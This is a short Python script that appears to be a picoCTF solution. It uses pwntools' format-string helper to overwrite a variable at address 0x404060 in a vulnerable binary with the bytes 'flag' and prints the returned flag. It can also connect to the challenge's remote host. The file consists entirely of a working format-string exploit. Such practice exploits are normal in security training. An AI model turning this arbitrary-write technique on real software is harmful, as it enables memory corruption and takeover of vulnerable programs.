#!/usr/bin/env python

import pwn
import sys

exe = pwn.ELF("./vuln")
pwn.context.binary = exe


def connect(local: bool):
    if local:
        return pwn.process(exe.path)
    else:
        return pwn.remote("rhea.picoctf.net", 51654)


def send(p):
    io = connect(local=True)

    pwn.log.info("payload  = %s" % repr(p))
    io.sendline(p)
    resp = io.recvall()
    if b"picoCTF" in resp:
        pwn.log.info("Flag = %s" % resp)
    return resp


sus_addr = 0x404060

fs = pwn.FmtStr(execute_fmt=send)
fs.write(sus_addr, 0x67616C66)
fs.execute_writes()
